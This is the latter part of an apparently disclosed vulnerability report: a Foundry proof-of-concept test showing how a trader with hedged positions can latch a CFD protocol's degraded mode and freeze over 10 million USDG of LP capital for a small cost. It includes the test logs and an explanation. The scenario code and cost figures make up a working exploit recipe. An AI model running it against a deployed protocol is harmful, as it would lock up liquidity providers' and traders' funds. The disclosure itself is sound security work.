            // Even a 50% adverse basket move does not make the fully margined leg liquidatable.
            uint256 beforeShock = vm.snapshotState();
            bytes[] memory shock = _mockPythUpdateData(1.5e8);
            uint256 shockFee = pletherOracle.getUpdateFee(shock);
            vm.deal(KEEPER, shockFee);
            vm.prank(KEEPER);
            vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
            router.executeLiquidation{value: shockFee}(ATTACKER_LONG, shock);
            vm.revertToState(beforeShock);
        }

        // 3. Right after the latch (requests not yet matured): frozen.
        _assertFrozen(false);
        console2.log("[freeze] right after the latch: settlement reverts with HousePool__DegradedMode");

        // 4. At the maturity boundary, after 24 h, and after 7 days: still frozen, E and L unchanged.
        uint256 boundary = pool.lpEpochStart(depositId);
        _warpTo(boundary);
        _assertFrozen(true);
        console2.log("[freeze] maturity boundary: matured deposit and redemptions not settled");

        vm.warp(boundary + 24 hours);
        _assertFrozen(true);
        assertGe(vm.getBlockTimestamp() - latchTime, 24 hours, "frozen for at least 24 h");
        console2.log("[freeze] hours since latch, still frozen    :", (vm.getBlockTimestamp() - latchTime) / 1 hours);

        vm.warp(boundary + 7 days);
        _assertFrozen(true);
        assertGe(vm.getBlockTimestamp() - latchTime, 7 days, "frozen for at least 7 days");
        assertEq(_expectedIndexedCarryAssets(ATTACKER_LONG), 0, "no carry accrued on the held leg");
        assertApproxEqAbs(_effectiveAssets(), effectiveAfter, 10e6, "E unchanged after 7 days");
        assertEq(_maxLiability(), edgeMaxLiability, "L unchanged after 7 days");
        console2.log("[freeze] hours since latch, still frozen    :", (vm.getBlockTimestamp() - latchTime) / 1 hours);
        console2.log("[freeze] L - E after 7 days (USDG)          :", (_maxLiability() - _effectiveAssets()) / 1e6);

        // 5. The only exit is owner money.
        uint256 need = _maxLiability() - _effectiveAssets();
        uint256 cureSnapshot = vm.snapshotState();

        // 5a. recapitalizePool(L - E) lets the owner clear the latch, but the payment is queued as pending
        //     recapitalization and LP settlement still makes no progress in this epoch.
        settlementToken.mint(address(this), need);
        settlementToken.approve(address(engine), need);
        engine.recapitalizePool(need);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "latch cleared after recapitalizing L - E");
        assertEq(pool.pendingRecapitalizationAssets(), need, "recapitalization is held as pending");
        bytes[] memory update = _mockPythUpdateData(MOVED_PRICE);
        uint256 fee = pletherOracle.getUpdateFee(update);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        router.settleLpEpoch{value: fee}(update);
        vm.revertToState(cureSnapshot);

        // 5b. The owner transfers USDG into the pool and admits it with accountExcess. One atom short of L - E is
        //     not enough; exactly L - E clears the latch and LP settlement resumes.
        settlementToken.mint(address(this), need);
        settlementToken.transfer(address(pool), need - 1);
        pool.accountExcess();
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        settlementToken.transfer(address(pool), 1);
        pool.accountExcess();
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner money is the only cure");
        console2.log("[cure] owner money needed to clear (USDG)   :", need / 1e6);

        _settleViaRouter(MOVED_PRICE);
        assertEq(juniorVault.claimableDepositRequest(depositId, NEW_LP), QUEUED_DEPOSIT, "deposit activates after cure");
        _refreshMark(MOVED_PRICE);
        vm.prank(BYSTANDER);
        clearinghouse.withdrawMargin(1000e6);
    }

    /// @notice Threshold: after a 0.80% move the best partial close of the winning leg already latches.
    function test_Threshold_BestPartialCloseAfter080PercentMoveLatches() public {
        // x* = (m - 0.0004(1+m)) D / (0.01 (1+m)^2) with m = 0.008, D = E, rounded down to the size quantum.
        _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, 7_478_100e18, 0, true, 1.008e8);
        assertTrue(engine.degradedMode(), "a 0.80% move with the best partial close latches");
        assertLt(_effectiveAssets(), _maxLiability(), "E < L");
        console2.log(
            "[threshold 0.80%] L - E after partial close (USDG):", (_maxLiability() - _effectiveAssets()) / 1e6
        );
        _logAttackerCost(1.008e8);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Controls
    // ---------------------------------------------------------------------------------------------------------------

    /// @notice Control A: same pool, same pair, same full close, but no price move. No latch; LP settlement works.
    function test_Control_SameCloseWithoutPriceMoveDoesNotLatch() public {
        (uint256 shortSize,,,,,,) = engine.positions(ATTACKER_SHORT);
        _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, shortSize, 0, true, ENTRY_PRICE);
        assertFalse(engine.degradedMode(), "no latch without the price move");
        assertGe(_effectiveAssets(), _maxLiability(), "E >= L");
        console2.log("[control A] E - L after close at 1.00 (USDG):", (_effectiveAssets() - _maxLiability()) / 1e6);

        _topUpLosingLeg();
        _assertLive(ENTRY_PRICE);
    }

    /// @notice Control B: same pool, same pair, same 1% price move, but no close. No latch; LP settlement works.
    function test_Control_PriceMoveWithoutCloseDoesNotLatch() public {
        _refreshMark(MOVED_PRICE);
        _topUpLosingLeg();
        assertFalse(engine.degradedMode(), "no latch without the close");
        assertGe(_effectiveAssets(), _maxLiability(), "E >= L");
        _assertLive(MOVED_PRICE);
    }

    /// @notice Control C: below the threshold (0.70% move) even a full close of the winning leg does not latch.
    function test_Control_SubThresholdMoveFullCloseDoesNotLatch() public {
        uint256 poolBefore = pool.totalAssets();
        (uint256 shortSize,,,,,,) = engine.positions(ATTACKER_SHORT);
        _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, shortSize, 0, true, 1.007e8);
        assertFalse(engine.degradedMode(), "a 0.70% move does not latch");
        assertGe(_effectiveAssets(), _maxLiability(), "E >= L");
        console2.log("[control C] pool cash paid at 1.007 (USDG)  :", (poolBefore - pool.totalAssets()) / 1e6);
        console2.log("[control C] E - L after close (USDG)        :", (_effectiveAssets() - _maxLiability()) / 1e6);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Assertions
    // ---------------------------------------------------------------------------------------------------------------

    function _assertFrozen(
        bool matured
    ) internal {
        // Permissionless LP epoch settlement reverts before it funds or activates anything.
        bytes[] memory update = _mockPythUpdateData(MOVED_PRICE);
        uint256 fee = pletherOracle.getUpdateFee(update);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        router.settleLpEpoch{value: fee}(update);

        assertEq(juniorVault.claimableDepositRequest(depositId, NEW_LP), 0, "queued deposit not activated");
        assertEq(juniorVault.claimableRedeemRequest(juniorRedeemId, JUNIOR_LP), 0, "Junior redemption not funded");
        assertEq(seniorVault.claimableRedeemRequest(seniorRedeemId, SENIOR_LP), 0, "Senior redemption not funded");

        if (matured) {
            // Matured requests cannot be taken back out of the queue either.
            vm.prank(NEW_LP);
            vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
            juniorVault.cancelPendingDeposit(depositId);
            vm.prank(JUNIOR_LP);
            vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
            juniorVault.cancelRedeemRequest(juniorRedeemId, JUNIOR_LP);
            vm.prank(SENIOR_LP);
            vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
            seniorVault.cancelRedeemRequest(seniorRedeemId, SENIOR_LP);
        }

        // Refresh the mark so every refusal below comes from the latch, not from a stale price.
        _refreshMark(MOVED_PRICE);

        // A trader with an open position cannot withdraw its free settlement.
        vm.prank(BYSTANDER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdrawMargin(1000e6);

        // No new position can be opened, not even a skew-reducing one.
        vm.prank(FRESH_TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        router.commitOrder(CfdTypes.Side.SHORT, 10_000e18, 1000e6, 0, false);

        // No new LP deposit can be queued.
        settlementToken.mint(LATE_LP, 100_000e6);
        vm.startPrank(LATE_LP);
        settlementToken.approve(address(juniorVault), 100_000e6);
        vm.expectRevert(TrancheVault.TrancheVault__DepositsUnavailable.selector);
        juniorVault.requestDeposit(100_000e6, LATE_LP, LATE_LP);
        vm.stopPrank();

        // The attacker's losing leg cannot be liquidated.
        bytes[] memory liquidationUpdate = _mockPythUpdateData(MOVED_PRICE);
        fee = pletherOracle.getUpdateFee(liquidationUpdate);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        router.executeLiquidation{value: fee}(ATTACKER_LONG, liquidationUpdate);

        // Nobody else can clear the latch, and the owner is refused while E < L.
        vm.prank(KEEPER);
        vm.expectRevert();
        engine.clearDegradedMode();
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        assertTrue(engine.degradedMode(), "still latched");
        assertLt(_effectiveAssets(), _maxLiability(), "E still below L");
    }

    /// @dev Without the latch the same matured requests settle: the queued deposit activates at the boundary, the
    ///      position holder can withdraw, a new open and a new deposit are accepted, and the activated deposit cash
    ///      funds the Senior redemption at the next epoch.
    function _assertLive(
        uint256 price
    ) internal {
        _warpTo(pool.lpEpochStart(depositId));
        _settleViaRouter(price);
        assertEq(juniorVault.claimableDepositRequest(depositId, NEW_LP), QUEUED_DEPOSIT, "queued deposit activates");
        console2.log(
            "[control] Senior redemption funded, epoch 1 (bps):",
            seniorVault.claimableRedeemRequest(seniorRedeemId, SENIOR_LP) * 10_000 / seniorRedeemShares
        );

        _refreshMark(price);
        vm.prank(BYSTANDER);
        clearinghouse.withdrawMargin(1000e6);
        vm.prank(FRESH_TRADER);
        router.commitOrder(CfdTypes.Side.SHORT, 10_000e18, 1000e6, 0, false);
        settlementToken.mint(LATE_LP, 100_000e6);
        vm.startPrank(LATE_LP);
        settlementToken.approve(address(juniorVault), 100_000e6);
        juniorVault.requestDeposit(100_000e6, LATE_LP, LATE_LP);
        vm.stopPrank();

        _warpTo(pool.lpEpochStart(depositId + 1));
        _settleViaRouter(price);
        uint256 seniorFundedBps =
            seniorVault.claimableRedeemRequest(seniorRedeemId, SENIOR_LP) * 10_000 / seniorRedeemShares;
        console2.log("[control] Senior redemption funded, epoch 2 (bps):", seniorFundedBps);
        assertEq(seniorFundedBps, 10_000, "Senior redemption fully funded by the next epoch");
        assertFalse(engine.degradedMode(), "never latched");
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Scenario helpers
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Alternating LONG (account A) and SHORT (account B) chunks of at most 2M keep skew under 0.4 x depth. Each
    ///      LONG chunk takes the largest size that keeps E >= L + B, minus one size quantum.
    function _buildHedgedPairAtAdmissionEdge() internal {
        _trade(ATTACKER_LONG, CfdTypes.Side.LONG, 2_000_000e18, 150_000e6, false, ENTRY_PRICE);
        // The first SHORT chunk also offsets the bystander's 10,000 LONG.
        _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, 2_010_000e18, 150_000e6, false, ENTRY_PRICE);
        for (uint256 i; i < 16; ++i) {
            uint256 room = _admissionRoom();
            if (room < QUANTUM_ASSETS) {
                break;
            }
            uint256 chunk = room > CHUNK_ASSETS ? CHUNK_ASSETS : room;
            uint256 size = (chunk / QUANTUM_ASSETS) * 100e18;
            // Each increase must fund its 10 bps liquidation reserve from new margin; 50 bps is posted.
            uint256 chunkMargin = chunk / 200;
            _trade(ATTACKER_LONG, CfdTypes.Side.LONG, size, chunkMargin, false, ENTRY_PRICE);
            _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, size, chunkMargin, false, ENTRY_PRICE);
        }
    }

    function _admissionRoom() internal view returns (uint256) {
        uint256 maxLiabilityTarget = (_effectiveAssets() * 10_000) / 10_025;
        uint256 maxLiability = _maxLiability();
        if (maxLiabilityTarget <= maxLiability + QUANTUM_ASSETS) {
            return 0;
        }
        return maxLiabilityTarget - maxLiability - QUANTUM_ASSETS;
    }

    /// @dev The carry base is max(maxProfit - PnL pledge, 0); the pledge is raised to the leg's maximum profit.
    function _topUpLosingLeg() internal {
        (,,, uint256 longMaxProfit,,,) = engine.positions(ATTACKER_LONG);
        // +1 USDG covers the few cents of accrued carry that addMargin realizes from the pledge first.
        uint256 topUp = longMaxProfit - clearinghouse.pnlPledgeAssets(ATTACKER_LONG) + 1e6;
        vm.prank(ATTACKER_LONG);
        engine.addMargin(ATTACKER_LONG, topUp);
        assertEq(_positionBorrowBaseAssets(ATTACKER_LONG), 0, "losing leg pays no carry");
        console2.log("[hold] margin added to the losing LONG (USDG):", topUp / 1e6);
    }

    function _logEdge() internal view {
        (uint256 longSize,,,,,,) = engine.positions(ATTACKER_LONG);
        (uint256 shortSize,,,,,,) = engine.positions(ATTACKER_SHORT);
        console2.log("[edge] attacker LONG size (units)           :", longSize / 1e18);
        console2.log("[edge] attacker SHORT size (units)          :", shortSize / 1e18);
        console2.log("[edge] E = pool assets - claims (USDG)      :", edgeEffectiveAssets / 1e6);
        console2.log("[edge] L = larger side max profit (USDG)    :", edgeMaxLiability / 1e6);
        console2.log("[edge] B = ceil(25 bps x L) (USDG)          :", edgeBuffer / 1e6);
        console2.log(
            "[edge] E - L - B (USDG)                     :", (edgeEffectiveAssets - edgeMaxLiability - edgeBuffer) / 1e6
        );
    }

    /// @dev Attacker cost at the latch, marked to market: deposits minus clearinghouse balances and open price PnL.
    function _logAttackerCost(
        uint256 price
    ) internal view {
        uint256 funded = ATTACKER_LONG_FUNDS + ATTACKER_SHORT_FUNDS;
        int256 equity = int256(_settlementBalance(ATTACKER_LONG) + _settlementBalance(ATTACKER_SHORT))
            + _pricePnl(ATTACKER_LONG, price) + _pricePnl(ATTACKER_SHORT, price);
        uint256 cost = uint256(int256(funded) - equity);
        (,,,,,, int256 longVpiAccrued) = engine.positions(ATTACKER_LONG);
        uint256 treasuryFees = _settlementBalance(engine.protocolTreasury()) - treasuryBeforeBuild;
        uint256 keeperBounties = _keeperWealth() - keeperBeforeBuild;
        uint256 lpCapital = pool.juniorPrincipal() + pool.seniorPrincipal();
        console2.log("[cost] attacker mark-to-market cost (USDG)  :", cost / 1e6);
        console2.log("[cost]  open fees to treasury (USDG)        :", treasuryFees / 1e6);
        console2.log("[cost]  keeper bounties (USDG)              :", keeperBounties / 1e6);
        console2.log("[cost]  kept by the pool (USDG)             :", (cost - treasuryFees - keeperBounties) / 1e6);
        console2.log("[cost]  LONG open VPI refundable on close   :", uint256(longVpiAccrued) / 1e6);
        console2.log("[harm] LP capital frozen (USDG)             :", lpCapital / 1e6);
        console2.log("[harm] queued LP deposit frozen (USDG)      :", QUEUED_DEPOSIT / 1e6);
        console2.log("[harm] frozen LP capital / attacker cost    :", lpCapital / cost);
        assertGt(lpCapital, 100 * cost, "frozen LP capital exceeds 100x the attacker's cost");
    }

    function _pricePnl(
        address account,
        uint256 price
    ) internal view returns (int256) {
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(account);
        if (size == 0) {
            return 0;
        }
        int256 entryCost = int256(engine.positionEntryCostAssetAtoms(account));
        int256 exitValue = int256((size / CfdTypes.SIZE_QUANTUM) * price);
        return side == CfdTypes.Side.LONG ? entryCost - exitValue : exitValue - entryCost;
    }

    function _effectiveAssets() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _buffer(
        uint256 maxLiability
    ) internal pure returns (uint256) {
        return (maxLiability * 25 + 9999) / 10_000;
    }

    function _keeperWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(KEEPER) + _settlementBalance(KEEPER);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory update = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getUpdateFee(update);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        router.updateMarkPrice{value: fee}(update);
    }

    function _settleViaRouter(
        uint256 price
    ) internal {
        bytes[] memory update = _mockPythUpdateData(price);
        uint256 fee = pletherOracle.getUpdateFee(update);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        router.settleLpEpoch{value: fee}(update);
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        if (vm.getBlockTimestamp() < timestamp) {
            vm.warp(timestamp);
        }
    }

}
```

### Output

```
Ran 5 tests for test/perps/poc/HedgedCloseLatchesDegradedModePoC.t.sol:HedgedCloseLatchesDegradedModePoC
[PASS] test_Control_PriceMoveWithoutCloseDoesNotLatch() (gas: 3672538)
Logs:
  [hold] margin added to the losing LONG (USDG): 9800972
  [control] Senior redemption funded, epoch 1 (bps): 3
  [control] Senior redemption funded, epoch 2 (bps): 10000

[PASS] test_Control_SameCloseWithoutPriceMoveDoesNotLatch() (gas: 4980714)
Logs:
  [control A] E - L after close at 1.00 (USDG): 74861
  [hold] margin added to the losing LONG (USDG): 9800972
  [control] Senior redemption funded, epoch 1 (bps): 998
  [control] Senior redemption funded, epoch 2 (bps): 10000

[PASS] test_Control_SubThresholdMoveFullCloseDoesNotLatch() (gas: 1829431)
Logs:
  [control C] pool cash paid at 1.007 (USDG)  : 15361
  [control C] E - L after close (USDG)        : 9740

[PASS] test_HedgedWinningCloseLatchesAndFreezesLpSettlement() (gas: 8885857)
Logs:
  [edge] attacker LONG size (units)           : 9966900
  [edge] attacker SHORT size (units)          : 9976900
  [edge] E = pool assets - claims (USDG)      : 10002002
  [edge] L = larger side max profit (USDG)    : 9976900
  [edge] B = ceil(25 bps x L) (USDG)          : 24942
  [edge] E - L - B (USDG)                     : 159
  [close] SHORT price gain at 1.01 (USDG)     : 99769
  [close] pool cash paid to SHORT (USDG)      : 44978
  [close] close fee paid to treasury (USDG)   : 0
  [close] E after (USDG)                      : 9957023
  [close] L after (USDG)                      : 9976900
  [close] L - E after (USDG)                  : 19876
  [cost] attacker mark-to-market cost (USDG)  : 62671
  [cost]  open fees to treasury (USDG)        : 7977
  [cost]  keeper bounties (USDG)              : 2
  [cost]  kept by the pool (USDG)             : 54692
  [cost]  LONG open VPI refundable on close   : 9952
  [harm] LP capital frozen (USDG)             : 10002000
  [harm] queued LP deposit frozen (USDG)      : 500000
  [harm] frozen LP capital / attacker cost    : 159
  [hold] margin added to the losing LONG (USDG): 9800972
  [freeze] right after the latch: settlement reverts with HousePool__DegradedMode
  [freeze] maturity boundary: matured deposit and redemptions not settled
  [freeze] hours since latch, still frozen    : 24
  [freeze] hours since latch, still frozen    : 168
  [freeze] L - E after 7 days (USDG)          : 19876
  [cure] owner money needed to clear (USDG)   : 19876

[PASS] test_Threshold_BestPartialCloseAfter080PercentMoveLatches() (gas: 2040152)
Logs:
  [threshold 0.80%] L - E after partial close (USDG): 3303
  [cost] attacker mark-to-market cost (USDG)  : 39321
  [cost]  open fees to treasury (USDG)        : 7977
  [cost]  keeper bounties (USDG)              : 2
  [cost]  kept by the pool (USDG)             : 31341
  [cost]  LONG open VPI refundable on close   : 9952
  [harm] LP capital frozen (USDG)             : 10002000
  [harm] queued LP deposit frozen (USDG)      : 500000
  [harm] frozen LP capital / attacker cost    : 254

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 39.62ms (24.40ms CPU time)
```

### Output vs expected
The attacker's own close of the winning leg sets `degradedMode`. Pool cash fell by 44,978 USDG, more than the 24,942 USDG buffer, while L stayed at 9,976,900 USDG. After the losing leg is fully margined, the pool stays latched for the whole 168 hours tested:
- LP epoch settlement reverts every time, so the matured Junior deposit never activates and neither the Junior nor the Senior redemption is funded. None of the three can be cancelled.
- The bystander cannot withdraw, no open is accepted, and no new deposit can be queued.
- The attacker's leg pays no carry and cannot be liquidated, even after a 50% move.
- E and L do not change.

Nobody but the owner can clear the latch, and the owner is refused until L − E (19,876 USDG) of its own money is in the pool. When that money comes through `recapitalizePool`, it stays pending and settlement still makes no progress. The attacker's cost is 39,321-62,671 USDG, and the frozen LP principal is 10,002,000 USDG plus the 500,000 USDG queued deposit. The controls show that neither the edge nor the price move alone latches, and that without the latch the same requests settle within two epochs.

Expected: a close whose gain is backed by the same owner's collateralized losing leg should not latch a pool that is not insolvent. A latch that reverts all LP settlement should not be something an untrusted trader can set at a time of its choosing and then hold at no carry cost, with no permissionless way to lift it.

